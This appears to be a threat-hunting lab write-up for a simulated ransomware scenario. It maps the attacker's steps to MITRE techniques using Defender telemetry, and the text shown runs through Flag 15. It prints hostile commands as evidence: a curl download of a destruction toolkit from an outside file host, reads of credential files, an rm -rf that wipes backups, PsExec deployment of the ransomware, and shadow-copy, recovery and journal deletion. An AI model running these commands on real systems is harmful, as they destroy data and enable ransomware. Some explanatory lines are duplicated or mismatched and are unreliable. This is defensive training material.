# 📚 Table of Contents

- [🧰 Platforms and Tools](#-platforms-and-tools)
- 🎯 Background, Objective, and Scope
- 🧠 Executive Summary
- 🔍 Summary of Findings (Flags)
- 🧩 Key Findings by Flag (With KQL + MITRE)
  - Phase 1: PHASE 1: LINUX BACKUP SERVER COMPROMISE (FLAGS 1-12)
  - PHASE 2: WINDOWS RANSOMWARE DEPLOYMENT (FLAGS 13-15)
  - PHASE 3: RECOVERY INHIBITION (FLAGS 16-22)
  - PHASE 4: PERSISTENCE (FLAGS 23-24)
  - PHASE 5: ANTI-FORENSICS (FLAG 25)
  - PHASE 6: RANSOMWARE SUCCESS (FLAG 26)
- [🎯 MITRE ATT&CK Technique Mapping](#-mitre-attck-technique-mapping)
- [💠 Diamond Model of Intrusion Analysis](#-diamond-model-of-intrusion-analysis)
- [🧾 Conclusion](#-conclusion)
- [🎓 Lessons Learned](#-lessons-learned)
- [🛠️ Recommendations for Remediation](#-recommendations-for-remediation)

---

## 🧰 Platforms and Tools

**Telemetry / Hunting Platform**
- Microsoft Defender for Endpoint (Advanced Hunting)

**Primary Tables Used**
- DeviceProcessEvents
- DeviceLogonEvents
- DeviceRegistryEvents
- DeviceFileEvents

**Analysis Method**
- Process + logon correlation (source → target)
- Command-line pivoting for LOLBins
- Persistence hunting (Registry Run Keys, Scheduled Tasks)
- Impact and anti-forensics verification

---

## 🎯 Background, Objective, and Scope

**Background**
The “Dead in the Water” scenario simulates a ransomware operator already inside an environment. The attacker progresses through backup compromise, recovery neutralization, lateral movement, ransomware execution, persistence, and anti-forensics.

**Objective**
Reconstruct the attacker’s behavior end-to-end, identify the commands/tools used at each stage, map actions to MITRE ATT&CK, and produce a report suitable for a SOC / client-facing incident summary.

**Scope**
***Systems involved (observed)***
- Windows workstation: adminpc / azuki-adminpc (source of remote execution)
- Linux backup server: azuki-backupsrv... (target of SSH pivot + backup destruction)

***Key attacker account observed***
- yuki.tanaka (Windows)
- backup-admin (Linux backup server)

---

## 🧠 Executive Summary

The attacker executed a ransomware playbook prioritizing ***recovery denial:***

1. Pivoted into backup infrastructure via SSH using a valid backup admin account ***(backup-admin@10.1.0.189)***.

2. Performed backup discovery (directories, archives, users, cron jobs) and accessed plaintext stored credentials in backup configs.

3. Transitioned to impact by deleting backups ***(rm -rf /backups/...)*** and disabling cron services ***(systemctl stop/disable cron)*** to prevent future backup creation.

4. Began Windows ransomware deployment using PsExec for remote execution.

5. Performed recovery inhibition and anti-forensics such as shadow copy manipulation, Windows recovery disablement (bcdedit), catalog deletion (wbadmin), and USN journal deletion (fsutil).

6. Established persistence using Registry Run keys and Scheduled Tasks masquerading as legitimate Windows security components.

7. Dropped ransom notes: ***SILENTLYNX_README.txt***.

---

## 🔍 Summary of Findings (Flags)

- ✅ Completed in this report: Flags 1–26

| Flag  | Phase              | Category            | Finding                                                           |
| ----- | ------------------ | ------------------- | ----------------------------------------------------------------- |
| 1     | Backup Compromise  | Lateral Movement    | `ssh.exe backup-admin@10.1.0.189`                                 |
| 2     | Backup Compromise  | Lateral Movement    | Source IP: `10.1.0.108`                                           |
| 3     | Backup Compromise  | Credential Abuse    | Account: `backup-admin`                                           |
| 4     | Backup Compromise  | Discovery           | `ls --color=auto -lh /backups/`                                   |
| 5     | Backup Compromise  | Discovery           | `find /backups -name *.tar.gz`                                    |
| 6     | Backup Compromise  | Discovery           | `cat /etc/passwd`                                                 |
| 7     | Backup Compromise  | Discovery           | `cat /etc/crontab`                                                |
| 8     | Backup Compromise  | Tool Transfer       | `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z`       |
| 9     | Backup Compromise  | Credential Access   | `cat /backups/configs/all-credentials.txt`                        |
| 10    | Backup Compromise  | Destruction         | `rm -rf /backups/...`                                             |
| 11    | Backup Compromise  | Service Stop        | `systemctl stop cron`                                             |
| 12    | Backup Compromise  | Service Disabled    | `systemctl disable cron`                                          |
| 13    | Windows Deployment | Remote Execution    | `psexec64.exe`                                                    |
| 14    | Windows Deployment | Deployment Command  | -u kenji.sato -p ***** -c -f C:\Windows\Temp\cache\silentlynx.exe |
| 15    | Windows Deployment | Payload             | silentlynx.exe                                                    |
| 16    | Recovery Inhibition| silentlynx.exe      | net stop VSS /y                                                   |
| 17    | Recovery Inhibition| Bckup Engine Stopped| net stop wbengine /y                                              |
| 18    | Recovery Inhibition| Process Termination | taskkill /F /IM <process>.exe (ex: sqlservr.exe)                  |
| 19    | Recovery Inhibition| Shadw Copies Deleted| vssadmin delete shadows /all /quiet                               |
| 20    | Impact             | Recovery Inhibition | `vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB` |
| 21    | Impact             | Recovery Disabled   | `bcdedit /set {default} recoveryenabled No`                       |
| 22    | Impact             | Catalog Deleted     | `"wbadmin" delete catalog -quiet`                                 |
| 23    | Persistence        | Registry Run Key    | `WindowsSecurityHealth`                                           |
| 24    | Persistence        | Scheduled Task      | `Microsoft\Windows\Security\SecurityHealthService`                |
| 25    | Anti-Forensics     | Journal Deletion    | `fsutil.exe usn deletejournal /D C:`                              |
| 26    | Ransomware Success | Ransom Note         | `SILENTLYNX_README.txt`                                           |

---

### 🏁 Flag 1: SSH Pivot to Backup Server

**MITRE:**
T1021.004 — Remote Services: SSH

**Question:**
What remote access command was executed from the compromised workstation?

**Answer**  
ssh.exe backup-admin@10.1.0.189

**Evidence:**

<img width="561" height="155" alt="image" src="https://github.com/user-attachments/assets/16e12311-2ba3-49bf-820b-d360e02035e2" />
<img width="757" height="158" alt="image" src="https://github.com/user-attachments/assets/aa40c955-8ac4-4e8d-87b7-7ed3482668cf" />

**Why This Matters:**
This confirms the attacker moved laterally into backup infrastructure early—consistent with modern ransomware operators who prioritize recovery denial.

---

### 🏁 Flag 2: Source IP for SSH Connection

**MITRE:**
T1021.004 — Remote Services: SSH

**Question:**
What IP address initiated the connection to the backup server?

**Answer**  
10.1.0.108

**Evidence:**

<img width="527" height="91" alt="image" src="https://github.com/user-attachments/assets/042edd0b-9520-4c8e-97dd-d4c7b64172e6" />
<img width="562" height="150" alt="image" src="https://github.com/user-attachments/assets/b8dbacd9-3fdb-4f1a-bb73-d9b4844a1d71" />


**Why This Matters:**
Reveals the internal source of lateral movement (east–west traffic), helping scope which host likely served as the pivot point.

---

### Flag 3: Account Used to Access Backup Server

**MITRE:**
T1078.002 — Valid Accounts: Domain Accounts

**Question:**
What account was used to access the backup server?

**Answer**  
backup-admin

**Evidence:**

<img width="529" height="80" alt="image" src="https://github.com/user-attachments/assets/aabacb30-9933-45ea-84e0-9da93a10ffcd" />
<img width="710" height="145" alt="image" src="https://github.com/user-attachments/assets/fca25bf1-b123-496f-bd06-c3a214d487d7" />

**Why This Matters:**
Shows credential compromise/abuse (not exploitation). Backup admin access is a high-impact privilege enabling backup discovery + destruction.

---

### Flag 4: Backup Directory Enumeration

**MITRE:**
T1083 — File and Directory Discovery

**Question:**
What command listed the backup directory contents?

**Answer**  
ls --color=auto -la /backups/

**Evidence:**

<img width="720" height="166" alt="image" src="https://github.com/user-attachments/assets/2ea267ff-9fa5-4763-b13b-3e8e4cbf411d" />
<img width="990" height="202" alt="image" src="https://github.com/user-attachments/assets/00e14966-9420-4235-b77d-ad90f10664de" />

**Why This Matters:**
Confirms structured reconnaissance of recovery assets.

---

### Flag 5: Search for Backup Archives

**MITRE:**
T1083 — File and Directory Discovery

**Question:**
What command searched for backup archives?

**Answer**  
find /backups -name *.tar.gz

**Evidence:**

<img width="885" height="158" alt="image" src="https://github.com/user-attachments/assets/fd5cbd99-cf49-4fb0-a1f4-505bbe3be0a6" />
<img width="1307" height="118" alt="image" src="https://github.com/user-attachments/assets/3c2ba38d-a99f-4fd1-bb90-bc7b471f952e" />

**Why This Matters:**
Shows the attacker identifying what recovery formats exist before destruction.

---

### Flag 6: Local Account Enumeration

**MITRE:**
T1087.001 — Account Discovery: Local Account

**Question:**
What command enumerated local accounts?

**Answer**  
cat /etc/passwd

**Evidence:**

<img width="765" height="133" alt="image" src="https://github.com/user-attachments/assets/eba9ef1c-c44c-4b23-bfed-7be5a266953d" />
<img width="569" height="181" alt="image" src="https://github.com/user-attachments/assets/cd056205-43b7-441a-83d0-5241dab6cb9d" />

---

### Flag 7: Scheduled Job Reconnaissance

**MITRE:**
T1083 — File and Directory Discovery

**Question:**
What command revealed scheduled jobs on the system?

**Answer**  
cat /etc/crontab

**Evidence:**

<img width="693" height="145" alt="image" src="https://github.com/user-attachments/assets/9987899f-6160-4f20-8c88-a9517cf6ca46" />
<img width="644" height="113" alt="image" src="https://github.com/user-attachments/assets/7cb1503d-7169-4a38-ac58-05422aba827d" />

**Why This Matters:**
Shows the attacker identifying what recovery formats exist before destruction.

---

### Flag 8: External Tool Download

**MITRE:**
T1105 — Ingress Tool Transfer

**Question:**
What command downloaded external tools? 

**Answer**  
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z

**Evidence:**

<img width="497" height="97" alt="image" src="https://github.com/user-attachments/assets/8ed74df2-6efd-4dd9-a453-1e69ba8c91bb" />
<img width="786" height="143" alt="image" src="https://github.com/user-attachments/assets/b2ee3e9d-bb79-4ef6-81bf-6c78fbb4858e" />

**Why This Matters:**
Marks the shift from recon → execution tooling. External file-hosting infrastructure is often used for rapid staging.

---

### Flag 9: Plaintext Credential Access

**MITRE:**
T1552.001 — Unsecured Credentials: Credentials in Files

**Question:**
What command accessed stored credentials? 

**Answer**  
cat /backups/configs/all-credentials.txt

**Evidence:**

<img width="1085" height="258" alt="image" src="https://github.com/user-attachments/assets/b3a06073-b12b-41df-86e0-e78e4e424318" />
<img width="1148" height="161" alt="image" src="https://github.com/user-attachments/assets/5eedb788-c8eb-4cd0-b8fc-016209632273" />

**Why This Matters:**
Backups became a credential vault, explaining speed + breadth of later lateral movement.

---

### Flag 10: Backup Destruction

**MITRE:**
T1485 — Data Destruction

**Question:**
What command destroyed backup files?

**Answer**  
rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations

**Evidence:**

<img width="802" height="127" alt="image" src="https://github.com/user-attachments/assets/c0545943-3f96-4b80-96ff-40d9e8b30315" />
<img width="1717" height="215" alt="image" src="https://github.com/user-attachments/assets/8db1e65f-bced-494a-891d-d87fb84b2080" />

**Why This Matters:**
Backups became a credential vault, explaining speed + breadth of later lateral movement.

---

### Flag 11: Backup Service Stopped

**MITRE:**
T1489 — Service Stop

**Question:**
What command stopped the backup service?

**Answer**  
systemctl stop cron

**Evidence:**

<img width="669" height="98" alt="image" src="https://github.com/user-attachments/assets/bc93efd0-f6bf-4b52-8d5a-bdfea68ec0a1" />
<img width="1464" height="77" alt="image" src="https://github.com/user-attachments/assets/08ba85dd-df3b-40c2-bd1e-927b0fbf8b5f" />

---

### Flag 12: Backup Service Disabled

**MITRE:**
Flag 12: Backup Service Disabled

**Question:**
What command permanently disabled the backup service?

**Answer**  
systemctl disable cron

**Evidence:**

<img width="675" height="103" alt="image" src="https://github.com/user-attachments/assets/80e76493-6f35-47ab-829e-4fd7a5470262" />
<img width="1486" height="117" alt="image" src="https://github.com/user-attachments/assets/b217920b-7ad2-4b25-b55e-e45aa8916495" />

---

### Flag 13: Remote Execution Tool

**MITRE:**
T1021.002 — SMB / Windows Admin Shares (Remote Services)

**Question:**
What tool executed commands on remote systems?

**Answer**  
psexec64.exe

**Evidence:**

<img width="941" height="128" alt="image" src="https://github.com/user-attachments/assets/227b765f-e20b-4f20-b10b-0524d196b51a" />
<img width="1360" height="345" alt="image" src="https://github.com/user-attachments/assets/cd32b84d-f9af-4c7f-a4f6-13c85c39c638" />

---

### Flag 14: Full Ransomware Deployment Command

**MITRE:**
T1021.002 — Remote Services: SMB / Admin Shares

**Question:**
What is the full deployment command?

**Answer**  
"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ***** -c -f C:\Windows\Temp\cache\silentlynx.exe

**Evidence:**

<img width="960" height="125" alt="image" src="https://github.com/user-attachments/assets/6f4b68bd-0174-4a89-994f-d23da3b6c283" />


**Why This Matters:**
This command captures the attacker’s exact hands-on deployment method

---

### Flag 15: Payload Deployed

**MITRE:**
T1204.002 — User Execution: Malicious File (as labeled in your tracker)

**Question:**
What payload was deployed?

**Answer**  
silentlynx.exe

**Evidence:**

<img width="854" height="192" alt="image" src="https://github.com/user-attachments/assets/b4cdbca0-7351-40b3-9048-a75136bb9c16" />

**Why This Matters:**
This command captures the attacker’s exact hands-on deployment method
